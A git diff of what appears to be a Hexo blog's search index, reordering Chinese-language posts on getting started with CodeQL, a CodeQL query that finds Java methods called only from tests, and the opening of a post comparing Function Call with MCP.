@@ -196,49 +196,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CodeQL入门</title>
-    <url>/2025/12/07/CodeQL%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h1 id="CodeQL-入门"><a href="#CodeQL-入门" class="headerlink" title="CodeQL 入门"></a>CodeQL 入门</h1><p>在网络安全和代码审计的领域，静态应用程序安全测试（Static application security testing，SAST）工具层出不穷。但在 2019 年 GitHub 收购 Semmle 之后，CodeQL 迅速成为了业界顶流。</p>
-<p>传统的扫描工具往往像是一个黑盒，你输入代码，它吐出报告。但 CodeQL 不同，它的核心理念非常有意思： <code>Code as Data</code> 代码即数据，CodeQL 把源代码转化成一个关系型数据库，而漏洞挖掘的过程，就变成了一次次编写 SQL（其实是 QL）查询语句的过程。</p>
-<p>CodeQL 工具包含两大部分组成：</p>
-<ul>
-<li>核心引擎(闭源)：用于解析源代码并存储于数据库，以及执行 QL 语句从数据库中进行查询；</li>
-<li>SDK代码库(开源)：包含各编程语言对应的 QL 代码库(属性/谓词/等)，以便快速编写查询语句。</li>
-</ul>
-<p>这给了安全研究员和开发者极大的自由度——不再受限于工具内置的规则，可以自己定义“什么样的代码长相存在漏洞”。这篇 Blog 记录了我第一次使用 CodeQL 进行静态代码分析的过程。</p>
-<span id="more"></span>
-<h2 id="一、CodeQL-核心工作流"><a href="#一、CodeQL-核心工作流" class="headerlink" title="一、CodeQL 核心工作流"></a>一、CodeQL 核心工作流</h2><p>使用 CodeQL 主要分为三个步骤：</p>
-<ol>
-<li><p><strong>创建数据库（Create Database）</strong>： 在编译/构建代码的过程中，CodeQL 会“旁路监听”，捕捉所有的编译命令、文件结构、函数调用关系，生成一个快照数据库；</p>
-</li>
-<li><p><strong>编写/运行查询（Analyze）</strong>： 使用一种类似 SQL 的面向对象查询语言（QL），在数据库中查找符合特征的代码片段；</p>
-</li>
-<li><p><strong>生成结果（Results）</strong>： 输出分析报告（通常是 SARIF 格式），定位到具体的代码行号。</p>
-</li>
-</ol>
-<h2 id="二、CodeQL-安装"><a href="#二、CodeQL-安装" class="headerlink" title="二、CodeQL 安装"></a>二、CodeQL 安装</h2><p>运行 CodeQL 需要安装 CodeQL CLI 工具，分开下载的话需要分别下载 CodeQL binary 和 SDK，需要放在相同目录下且版本保持一致，也可以直接下载捆绑包，以 Ubuntu 环境为例，安装命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/github/codeql-action/releases/download/codeql-bundle-v2.16.1/codeql-bundle-linux64.tar.gz</span><br><span class="line"></span><br><span class="line">tar -xvzf codeql-bundle-linux64.tar.gz</span><br><span class="line"></span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/aono/codeqlsrc/codeql</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
-<p>检测是否安装成功：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql --version</span><br></pre></td></tr></table></figure>
-<p>可以使用  <code>codeQL resolve languages</code> 可以查看支持的编程语言。</p>
-<h2 id="三、CodeQL-简单使用"><a href="#三、CodeQL-简单使用" class="headerlink" title="三、CodeQL 简单使用"></a>三、CodeQL 简单使用</h2><p>指定项目创建数据库，以 Java 目标（<a href="https://github.com/l4yn3/micro_service_seclab）为例，项目通过">https://github.com/l4yn3/micro_service_seclab）为例，项目通过</a> mvn 构建，首先安装 mvn：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt install maven -y</span><br></pre></td></tr></table></figure>
-<p>创建数据库：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./codeql/codeql database create java_db --language=java --source-root=./test/micro_service_seclab/</span><br></pre></td></tr></table></figure>
-<p><img src="../uploads/codeql_1.png" alt=""></p>
-<p>使用默认规则进行查询，生成 SARIF 文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./codeql/codeql database analyze java_db/ --format=sarif-latest --output=java_result.sarif</span><br></pre></td></tr></table></figure>
-<p><img src="../uploads/codeql_2.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>SAST</category>
-      </categories>
-      <tags>
-        <tag>CodeQL</tag>
-        <tag>SAST</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CodeQL-MCP架构解读</title>
     <url>/2025/12/15/CodeQL-MCP%E6%9E%B6%E6%9E%84%E8%A7%A3%E8%AF%BB/</url>
     <content><![CDATA[<p>本片内容以 <a href="https://github.com/JordyZomer/codeql-mcp">https://github.com/JordyZomer/codeql-mcp</a> 为基础，进行 CodeQL MCP 的开发学习。</p>
@@ -405,6 +362,183 @@
       </tags>
   </entry>
   <entry>
+    <title>CodeQL入门</title>
+    <url>/2025/12/07/CodeQL%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h1 id="CodeQL-入门"><a href="#CodeQL-入门" class="headerlink" title="CodeQL 入门"></a>CodeQL 入门</h1><p>在网络安全和代码审计的领域，静态应用程序安全测试（Static application security testing，SAST）工具层出不穷。但在 2019 年 GitHub 收购 Semmle 之后，CodeQL 迅速成为了业界顶流。</p>
+<p>传统的扫描工具往往像是一个黑盒，你输入代码，它吐出报告。但 CodeQL 不同，它的核心理念非常有意思： <code>Code as Data</code> 代码即数据，CodeQL 把源代码转化成一个关系型数据库，而漏洞挖掘的过程，就变成了一次次编写 SQL（其实是 QL）查询语句的过程。</p>
+<p>CodeQL 工具包含两大部分组成：</p>
+<ul>
+<li>核心引擎(闭源)：用于解析源代码并存储于数据库，以及执行 QL 语句从数据库中进行查询；</li>
+<li>SDK代码库(开源)：包含各编程语言对应的 QL 代码库(属性/谓词/等)，以便快速编写查询语句。</li>
+</ul>
+<p>这给了安全研究员和开发者极大的自由度——不再受限于工具内置的规则，可以自己定义“什么样的代码长相存在漏洞”。这篇 Blog 记录了我第一次使用 CodeQL 进行静态代码分析的过程。</p>
+<span id="more"></span>
+<h2 id="一、CodeQL-核心工作流"><a href="#一、CodeQL-核心工作流" class="headerlink" title="一、CodeQL 核心工作流"></a>一、CodeQL 核心工作流</h2><p>使用 CodeQL 主要分为三个步骤：</p>
+<ol>
+<li><p><strong>创建数据库（Create Database）</strong>： 在编译/构建代码的过程中，CodeQL 会“旁路监听”，捕捉所有的编译命令、文件结构、函数调用关系，生成一个快照数据库；</p>
+</li>
+<li><p><strong>编写/运行查询（Analyze）</strong>： 使用一种类似 SQL 的面向对象查询语言（QL），在数据库中查找符合特征的代码片段；</p>
+</li>
+<li><p><strong>生成结果（Results）</strong>： 输出分析报告（通常是 SARIF 格式），定位到具体的代码行号。</p>
+</li>
+</ol>
+<h2 id="二、CodeQL-安装"><a href="#二、CodeQL-安装" class="headerlink" title="二、CodeQL 安装"></a>二、CodeQL 安装</h2><p>运行 CodeQL 需要安装 CodeQL CLI 工具，分开下载的话需要分别下载 CodeQL binary 和 SDK，需要放在相同目录下且版本保持一致，也可以直接下载捆绑包，以 Ubuntu 环境为例，安装命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/github/codeql-action/releases/download/codeql-bundle-v2.16.1/codeql-bundle-linux64.tar.gz</span><br><span class="line"></span><br><span class="line">tar -xvzf codeql-bundle-linux64.tar.gz</span><br><span class="line"></span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/aono/codeqlsrc/codeql</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
+<p>检测是否安装成功：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql --version</span><br></pre></td></tr></table></figure>
+<p>可以使用  <code>codeQL resolve languages</code> 可以查看支持的编程语言。</p>
+<h2 id="三、CodeQL-简单使用"><a href="#三、CodeQL-简单使用" class="headerlink" title="三、CodeQL 简单使用"></a>三、CodeQL 简单使用</h2><p>指定项目创建数据库，以 Java 目标（<a href="https://github.com/l4yn3/micro_service_seclab）为例，项目通过">https://github.com/l4yn3/micro_service_seclab）为例，项目通过</a> mvn 构建，首先安装 mvn：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt install maven -y</span><br></pre></td></tr></table></figure>
+<p>创建数据库：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./codeql/codeql database create java_db --language=java --source-root=./test/micro_service_seclab/</span><br></pre></td></tr></table></figure>
+<p><img src="../uploads/codeql_1.png" alt=""></p>
+<p>使用默认规则进行查询，生成 SARIF 文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./codeql/codeql database analyze java_db/ --format=sarif-latest --output=java_result.sarif</span><br></pre></td></tr></table></figure>
+<p><img src="../uploads/codeql_2.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>SAST</category>
+      </categories>
+      <tags>
+        <tag>CodeQL</tag>
+        <tag>SAST</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CodeQL规则编写_Java内部测试API提取</title>
+    <url>/2026/01/17/CodeQL%E8%A7%84%E5%88%99%E7%BC%96%E5%86%99-Java%E5%86%85%E9%83%A8%E6%B5%8B%E8%AF%95API%E6%8F%90%E5%8F%96/</url>
+    <content><![CDATA[<p>在 IRIS 项目中，第二步是提取全部内部测试 API ，CodeQL 规则编写如下，因为不太理解 CodeQL 规则如何编写，所以学习记录如下，内容由 GPT 5.2 生成。</p>
+<p>解读方式：“<strong>这条规则想解决什么问题 → 每个谓词/函数做什么 → where 条件组合后的真实含义 → 可能的坑与改进</strong>”的顺序，带你把它吃透。</p>
+<h2 id="1）一句话概括：这条规则在找什么？"><a href="#1）一句话概括：这条规则在找什么？" class="headerlink" title="1）一句话概括：这条规则在找什么？"></a>1）一句话概括：这条规则在找什么？</h2><p>它在找：</p>
+<blockquote>
+<p><strong>“在 src/test 里被调用过、但在非 test（业务代码）里从未被调用过”的 public 且有参数的源代码方法。</strong></p>
+</blockquote>
+<p>更口语一点：</p>
+<ul>
+<li>✅ 测试代码里在用它（isTested）</li>
+<li>❌ 业务代码里没人用它（isNotInvokedByInternalFunction）</li>
+<li>并且方法是 public、来自项目源码、且至少有一个参数</li>
+</ul>
+<p>这类方法常见场景：</p>
+<ul>
+<li>只为了测试而写的“辅助 API”（不一定是好事）</li>
+<li>public 暴露出去但实际上没人用（可能是 dead API / 过度暴露）</li>
+<li>测试通过“直接调用内部方法”来测（可能说明设计不佳或测试方式不对）</li>
+</ul>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">bindingset[m]</span><br><span class="line">string fullSignature(Callable m) &#123;</span><br><span class="line">    if m instanceof Constructor</span><br><span class="line">    then</span><br><span class="line">        result = m.getName() + &quot;(&quot; + concat(int i | i = [0 .. m.getNumberOfParameters()] | m.getParameter(i).getType().getName() + &quot; &quot; + m.getParameter(i).getName(), &quot;, &quot;  order by i asc)  + &quot;)&quot;</span><br><span class="line">    else</span><br><span class="line">        result = m.getReturnType().getName() + &quot; &quot; + m.getName() + &quot;(&quot; + concat(int i | i = [0 .. m.getNumberOfParameters()] | m.getParameter(i).getType().getName() + &quot; &quot; + m.getParameter(i).getName(), &quot;, &quot;  order by i asc)  + &quot;)&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isTested(Callable m) &#123;</span><br><span class="line">    exists(Call c |</span><br><span class="line">        c.getCallee() = m and</span><br><span class="line">        c.getLocation().toString().indexOf(&quot;src/test&quot;) &gt;= 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isNotInvokedByInternalFunction(Callable m) &#123;</span><br><span class="line">    not exists(Call c |</span><br><span class="line">        c.getCallee() = m and</span><br><span class="line">        c.getLocation().toString().indexOf(&quot;src/test&quot;) &lt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bindingset[m]</span><br><span class="line">string paramTypes(Callable m) &#123;</span><br><span class="line">    result = concat(int i | i = [0 .. m.getNumberOfParameters()] | m.getParameter(i).getType().getName(), &quot;;&quot; order by i asc)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bindingset[m]</span><br><span class="line">string getJavadocString(Callable m) &#123;</span><br><span class="line">    if (exists(Javadoc d | m.getDoc().getJavadoc() = d))</span><br><span class="line">    then</span><br><span class="line">        result = concat(int i | i = [0 .. m.getDoc().getJavadoc().getNumChild()] | m.getDoc().getJavadoc().getChild(i).getText(), &quot; &quot; order by i asc)</span><br><span class="line">    else</span><br><span class="line">        result = &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from</span><br><span class="line">    Callable method</span><br><span class="line">where</span><br><span class="line">    method.fromSource() and</span><br><span class="line">    method.isPublic() and</span><br><span class="line">    not method.hasNoParameters() and</span><br><span class="line">    isTested(method) and</span><br><span class="line">    isNotInvokedByInternalFunction(method)</span><br><span class="line">select</span><br><span class="line">    method.getDeclaringType().getSourceDeclaration().getPackage() as package,</span><br><span class="line">    method.getDeclaringType().getSourceDeclaration() as clazz,</span><br><span class="line">    method.getName() as func,</span><br><span class="line">    fullSignature(method) as full_signature,</span><br><span class="line">    method.getStringSignature() as internal_signature,</span><br><span class="line">    method.getLocation().toString() as location,</span><br><span class="line">    paramTypes(method) as parameter_types,</span><br><span class="line">    method.getReturnType().getName() as return_type,</span><br><span class="line">    getJavadocString(method) as doc</span><br></pre></td></tr></table></figure>
+<h2 id="2）fullSignature-Callable-m-：拼一个“人类可读签名”"><a href="#2）fullSignature-Callable-m-：拼一个“人类可读签名”" class="headerlink" title="2）fullSignature(Callable m)：拼一个“人类可读签名”"></a>2）<code>fullSignature(Callable m)</code>：拼一个“人类可读签名”</h2><p>你这段和上一条差不多，只是单独拿来复用。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bindingset[m]</span><br><span class="line">string fullSignature(Callable m) &#123;</span><br><span class="line">  if m instanceof Constructor</span><br><span class="line">  then</span><br><span class="line">    result = m.getName() + &quot;(&quot; + concat(...参数列表...) + &quot;)&quot;</span><br><span class="line">  else</span><br><span class="line">    result = m.getReturnType().getName() + &quot; &quot; + m.getName() + &quot;(&quot; + concat(...参数列表...) + &quot;)&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="关键点-A：Constructor-vs-普通方法"><a href="#关键点-A：Constructor-vs-普通方法" class="headerlink" title="关键点 A：Constructor vs 普通方法"></a>关键点 A：Constructor vs 普通方法</h3><ul>
+<li>构造函数没有返回值，所以输出 <code>ClassName(...)</code></li>
+<li>普通方法输出 <code>ReturnType methodName(...)</code></li>
+</ul>
+<h3 id="关键点-B：concat-遍历参数"><a href="#关键点-B：concat-遍历参数" class="headerlink" title="关键点 B：concat 遍历参数"></a>关键点 B：concat 遍历参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(int i |</span><br><span class="line">  i = [0 .. m.getNumberOfParameters()] |</span><br><span class="line">  m.getParameter(i).getType().getName() + &quot; &quot; + m.getParameter(i).getName(),</span><br><span class="line">  &quot;, &quot; order by i asc)</span><br></pre></td></tr></table></figure>
+<p>它的意图是按参数顺序拼成：<br><code>int a, java.lang.String b</code></p>
+<p>⚠️ <strong>潜在坑：索引范围</strong></p>
+<ul>
+<li><code>m.getNumberOfParameters()</code> 返回参数个数，比如 2</li>
+<li>参数下标通常是 <code>0</code> 和 <code>1</code></li>
+<li>但你用了 <code>[0 .. m.getNumberOfParameters()]</code>（包含上界的话会多取一次）</li>
+</ul>
+<p>在很多 CodeQL 示例里会用：</p>
+<ul>
+<li><code>[0 .. m.getNumberOfParameters()-1]</code></li>
+<li>或者用 <code>Parameter p | p = m.getAParameter()</code> 这种更安全的写法</li>
+</ul>
+<p>如果你跑起来没报错，可能是 CodeQL 的区间语义/实现把最后一个排除了，但<strong>从阅读角度这段写法很容易“越界风险”</strong>，建议改成更明确的写法。</p>
+<h2 id="3）isTested-Callable-m-：在测试目录出现过调用"><a href="#3）isTested-Callable-m-：在测试目录出现过调用" class="headerlink" title="3）isTested(Callable m)：在测试目录出现过调用"></a>3）<code>isTested(Callable m)</code>：在测试目录出现过调用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">predicate isTested(Callable m) &#123;</span><br><span class="line">  exists(Call c |</span><br><span class="line">    c.getCallee() = m and</span><br><span class="line">    c.getLocation().toString().indexOf(&quot;src/test&quot;) &gt;= 0</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="它在做什么？"><a href="#它在做什么？" class="headerlink" title="它在做什么？"></a>它在做什么？</h3><ul>
+<li>遍历所有调用 <code>Call c</code></li>
+<li>找到被调用目标是 <code>m</code> 的调用点</li>
+<li>并且调用点的位置字符串里包含 <code>&quot;src/test&quot;</code></li>
+</ul>
+<p>✅ 这就是：<strong>至少有一次调用发生在 src/test 目录中</strong></p>
+<h3 id="⚠️-这条判断“测试代码”的方式比较粗糙"><a href="#⚠️-这条判断“测试代码”的方式比较粗糙" class="headerlink" title="⚠️ 这条判断“测试代码”的方式比较粗糙"></a>⚠️ 这条判断“测试代码”的方式比较粗糙</h3><ul>
+<li>Maven/Gradle 常见测试路径：<code>src/test/java</code></li>
+<li>但也可能是：<code>src/test/kotlin</code>、<code>src/integrationTest</code>、<code>test/</code>、<code>src/it</code> 等</li>
+<li>甚至 Windows 路径分隔符等问题（不过 <code>toString()</code> 一般会统一）</li>
+</ul>
+<p>更稳妥方式是用 CodeQL 自带的测试/文件夹抽象（如果有），或者用正则匹配更完整路径。</p>
+<h2 id="4）isNotInvokedByInternalFunction-Callable-m-：业务代码里从未调用过"><a href="#4）isNotInvokedByInternalFunction-Callable-m-：业务代码里从未调用过" class="headerlink" title="4）isNotInvokedByInternalFunction(Callable m)：业务代码里从未调用过"></a>4）<code>isNotInvokedByInternalFunction(Callable m)</code>：业务代码里从未调用过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">predicate isNotInvokedByInternalFunction(Callable m) &#123;</span><br><span class="line">  not exists(Call c |</span><br><span class="line">    c.getCallee() = m and</span><br><span class="line">    c.getLocation().toString().indexOf(&quot;src/test&quot;) &lt; 0</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="翻译成人话"><a href="#翻译成人话" class="headerlink" title="翻译成人话"></a>翻译成人话</h3><p>不存在这样的调用 <code>c</code>：</p>
+<ul>
+<li>调用了 <code>m</code></li>
+<li>并且调用位置 <strong>不在</strong> <code>src/test</code>（因为 indexOf &lt; 0 表示没找到）</li>
+</ul>
+<p>等价于：</p>
+<blockquote>
+<p><strong>m 的所有调用点都在测试目录中</strong>（或者根本没人调用）</p>
+</blockquote>
+<p>但注意：你在 where 里又加了 <code>isTested(method)</code>，所以确保至少在测试里被调用一次。<br>因此最终效果是：</p>
+<blockquote>
+<p><strong>只被测试调用过（至少一次），从不被业务代码调用。</strong></p>
+</blockquote>
+<h3 id="⚠️-命名有点误导"><a href="#⚠️-命名有点误导" class="headerlink" title="⚠️ 命名有点误导"></a>⚠️ 命名有点误导</h3><p><code>isNotInvokedByInternalFunction</code> 其实检查的是“非 test 的任何调用”。<br>并不一定是“internal function”（内部函数）调用，也可能是 main、工具脚本、样例代码等。<br>更贴切的名字可能是 <code>hasNoNonTestCallSites</code>。</p>
+<h2 id="5）paramTypes-Callable-m-：只拼参数类型"><a href="#5）paramTypes-Callable-m-：只拼参数类型" class="headerlink" title="5）paramTypes(Callable m)：只拼参数类型"></a>5）<code>paramTypes(Callable m)</code>：只拼参数类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = concat(int i | i = [0 .. m.getNumberOfParameters()] |</span><br><span class="line">  m.getParameter(i).getType().getName(), &quot;;&quot; order by i asc)</span><br></pre></td></tr></table></figure>
+<p>输出像：<br><code>int;java.lang.String;boolean</code></p>
+<p>用途通常是：</p>
+<ul>
+<li>比 <code>getStringSignature()</code> 更可控</li>
+<li>用于后处理（CSV 分析）做“方法重载区分”</li>
+</ul>
+<p>同样有上面提到的索引区间潜在坑。</p>
+<h2 id="6）getJavadocString-Callable-m-：把-JavaDoc-扁平化成字符串"><a href="#6）getJavadocString-Callable-m-：把-JavaDoc-扁平化成字符串" class="headerlink" title="6）getJavadocString(Callable m)：把 JavaDoc 扁平化成字符串"></a>6）<code>getJavadocString(Callable m)</code>：把 JavaDoc 扁平化成字符串</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (exists(Javadoc d | m.getDoc().getJavadoc() = d))</span><br><span class="line">then result = concat(...child text...)</span><br><span class="line">else result = &quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>这个函数最终让你的输出列里有 doc 文本，方便：</p>
+<ul>
+<li>生成报告</li>
+<li>过滤“有没有说明文档”</li>
+<li>做 NLP/检索（比如把这些 API 建索引）</li>
+</ul>
+<h2 id="7）主查询：from-where-的组合含义"><a href="#7）主查询：from-where-的组合含义" class="headerlink" title="7）主查询：from / where 的组合含义"></a>7）主查询：from / where 的组合含义</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Callable method</span><br><span class="line">where</span><br><span class="line">  method.fromSource() and</span><br><span class="line">  method.isPublic() and</span><br><span class="line">  not method.hasNoParameters() and</span><br><span class="line">  isTested(method) and</span><br><span class="line">  isNotInvokedByInternalFunction(method)</span><br><span class="line">select ...</span><br></pre></td></tr></table></figure>
+<p>逐个解释：</p>
+<h3 id="✅-method-fromSource"><a href="#✅-method-fromSource" class="headerlink" title="✅ method.fromSource()"></a>✅ <code>method.fromSource()</code></h3><p>只选项目源码里的方法（排除库/依赖里解析出来的方法）</p>
+<h3 id="✅-method-isPublic"><a href="#✅-method-isPublic" class="headerlink" title="✅ method.isPublic()"></a>✅ <code>method.isPublic()</code></h3><p>只关心 public 方法<br>→ 这意味着你在找“对外暴露的 API”，但其实只被测试用。</p>
+<h3 id="✅-not-method-hasNoParameters"><a href="#✅-not-method-hasNoParameters" class="headerlink" title="✅ not method.hasNoParameters()"></a>✅ <code>not method.hasNoParameters()</code></h3><p>只关心<strong>有参数的方法</strong><br>（可能你想排除 getter / toString 这种零参方法，让结果更有价值）</p>
+<h3 id="✅-isTested-method"><a href="#✅-isTested-method" class="headerlink" title="✅ isTested(method)"></a>✅ <code>isTested(method)</code></h3><p>必须在 <code>src/test</code> 至少出现一次调用</p>
+<h3 id="✅-isNotInvokedByInternalFunction-method"><a href="#✅-isNotInvokedByInternalFunction-method" class="headerlink" title="✅ isNotInvokedByInternalFunction(method)"></a>✅ <code>isNotInvokedByInternalFunction(method)</code></h3><p>必须在非 test 路径中 <strong>没有任何调用</strong></p>
+<h2 id="8）select-输出：你最终想拿到什么信息？"><a href="#8）select-输出：你最终想拿到什么信息？" class="headerlink" title="8）select 输出：你最终想拿到什么信息？"></a>8）select 输出：你最终想拿到什么信息？</h2><p>你输出的是一张“方法清单”表：</p>
+<ul>
+<li>package</li>
+<li>clazz</li>
+<li>func（方法名）</li>
+<li>full_signature（人类可读签名）</li>
+<li>internal_signature（CodeQL 的签名字符串，更偏机器）</li>
+<li>location（方法声明位置）</li>
+<li>parameter_types（类型列表）</li>
+<li>return_type</li>
+<li>doc（Javadoc）</li>
+</ul>
+<p>👉 这是典型的“导出 CSV / 报告”的结构。</p>
+<h2 id="9）这条规则的典型用途（为什么有意义？）"><a href="#9）这条规则的典型用途（为什么有意义？）" class="headerlink" title="9）这条规则的典型用途（为什么有意义？）"></a>9）这条规则的典型用途（为什么有意义？）</h2><p>它可以用于发现：</p>
+<h3 id="A-只为测试写的-public-API（过度暴露）"><a href="#A-只为测试写的-public-API（过度暴露）" class="headerlink" title="A. 只为测试写的 public API（过度暴露）"></a>A. 只为测试写的 public API（过度暴露）</h3><p>如果一个 public 方法只被测试调用，那它可能本不该是 public。</p>
+<h3 id="B-“死-API”"><a href="#B-“死-API”" class="headerlink" title="B. “死 API”"></a>B. “死 API”</h3><p>对业务没有任何调用，但测试仍在测它——可能是旧功能遗留。</p>
+<h3 id="C-测试策略问题"><a href="#C-测试策略问题" class="headerlink" title="C. 测试策略问题"></a>C. 测试策略问题</h3><p>测试直接调用内部方法，而不是通过更高层接口测试行为。</p>
+<h2 id="10）重要的坑与改进建议（很实用）"><a href="#10）重要的坑与改进建议（很实用）" class="headerlink" title="10）重要的坑与改进建议（很实用）"></a>10）重要的坑与改进建议（很实用）</h2><h3 id="改进-1：测试路径判断更稳"><a href="#改进-1：测试路径判断更稳" class="headerlink" title="改进 1：测试路径判断更稳"></a>改进 1：测试路径判断更稳</h3><p>当前用 <code>&quot;src/test&quot;</code> 字符串包含判断，建议更精确：</p>
+<ul>
+<li>匹配 <code>src/test/java</code>、<code>src/test/kotlin</code></li>
+<li>或额外覆盖 <code>src/integrationTest</code> 等</li>
+</ul>
+<h3 id="改进-2：区分“被测试调用”-vs-“测试类反射-框架调用”"><a href="#改进-2：区分“被测试调用”-vs-“测试类反射-框架调用”" class="headerlink" title="改进 2：区分“被测试调用” vs “测试类反射/框架调用”"></a>改进 2：区分“被测试调用” vs “测试类反射/框架调用”</h3><p>如果测试是通过反射、参数化框架、Spring 容器间接触发，有时 <code>Call</code> 不会出现显式调用点。结果会漏。</p>
+<h3 id="改进-3：排除构造函数-重载-接口方法等"><a href="#改进-3：排除构造函数-重载-接口方法等" class="headerlink" title="改进 3：排除构造函数/重载/接口方法等"></a>改进 3：排除构造函数/重载/接口方法等</h3><p>你现在是 <code>Callable</code>，包含：</p>
+<ul>
+<li>方法</li>
+<li>构造器</li>
+<li>可能还包括一些特殊 callable</li>
+</ul>
+<p>如果你的目标是“public 方法”，更常用 <code>Method</code> 类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Method method</span><br></pre></td></tr></table></figure>
+<h3 id="改进-4：把-“业务代码里没人调用”-限定为-fromSource"><a href="#改进-4：把-“业务代码里没人调用”-限定为-fromSource" class="headerlink" title="改进 4：把 “业务代码里没人调用” 限定为 fromSource"></a>改进 4：把 “业务代码里没人调用” 限定为 fromSource</h3><p>现在 <code>isNotInvokedByInternalFunction</code> 只看 location 字符串。<br>更稳的是限定调用点来源文件也是 source。</p>
+]]></content>
+      <categories>
+        <category>SAST</category>
+      </categories>
+      <tags>
+        <tag>CodeQL</tag>
+        <tag>SAST</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CodeQL入门（二）</title>
     <url>/2025/12/17/CodeQL%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
     <content><![CDATA[<h2 id="CodeQL-查询语句编写"><a href="#CodeQL-查询语句编写" class="headerlink" title="CodeQL 查询语句编写"></a>CodeQL 查询语句编写</h2><p>以python为例，编写一个简单的hello world codeql查询。首先需要使用 codeql 创建一个数据库，这样才能为其编写查询语句，使用如下命令创建数据库：</p>
@@ -550,137 +684,124 @@
       </tags>
   </entry>
   <entry>
-    <title>CodeQL规则编写_Java内部测试API提取</title>
-    <url>/2026/01/17/CodeQL%E8%A7%84%E5%88%99%E7%BC%96%E5%86%99-Java%E5%86%85%E9%83%A8%E6%B5%8B%E8%AF%95API%E6%8F%90%E5%8F%96/</url>
-    <content><![CDATA[<p>在 IRIS 项目中，第二步是提取全部内部测试 API ，CodeQL 规则编写如下，因为不太理解 CodeQL 规则如何编写，所以学习记录如下，内容由 GPT 5.2 生成。</p>
-<p>解读方式：“<strong>这条规则想解决什么问题 → 每个谓词/函数做什么 → where 条件组合后的真实含义 → 可能的坑与改进</strong>”的顺序，带你把它吃透。</p>
-<h2 id="1）一句话概括：这条规则在找什么？"><a href="#1）一句话概括：这条规则在找什么？" class="headerlink" title="1）一句话概括：这条规则在找什么？"></a>1）一句话概括：这条规则在找什么？</h2><p>它在找：</p>
-<blockquote>
-<p><strong>“在 src/test 里被调用过、但在非 test（业务代码）里从未被调用过”的 public 且有参数的源代码方法。</strong></p>
-</blockquote>
-<p>更口语一点：</p>
-<ul>
-<li>✅ 测试代码里在用它（isTested）</li>
-<li>❌ 业务代码里没人用它（isNotInvokedByInternalFunction）</li>
-<li>并且方法是 public、来自项目源码、且至少有一个参数</li>
-</ul>
-<p>这类方法常见场景：</p>
-<ul>
-<li>只为了测试而写的“辅助 API”（不一定是好事）</li>
-<li>public 暴露出去但实际上没人用（可能是 dead API / 过度暴露）</li>
-<li>测试通过“直接调用内部方法”来测（可能说明设计不佳或测试方式不对）</li>
-</ul>
+    <title>Function Call和MCP的区别</title>
+    <url>/2025/12/11/Function-Call%E5%92%8CMCP%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
+    <content><![CDATA[<h2 id="Function-Call和MCP的核心区别梳理（由GPT-5-1-生成）"><a href="#Function-Call和MCP的核心区别梳理（由GPT-5-1-生成）" class="headerlink" title="Function Call和MCP的核心区别梳理（由GPT 5.1 生成）"></a>Function Call和MCP的核心区别梳理（由GPT 5.1 生成）</h2><h2 id="🧩核心区别总结"><a href="#🧩核心区别总结" class="headerlink" title="🧩核心区别总结"></a>🧩核心区别总结</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Function Call</th>
+<th>MCP（Model Context Protocol）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>定位</strong></td>
+<td>让模型按照开发者定义的结构化方式返回“调用某函数所需的参数”。</td>
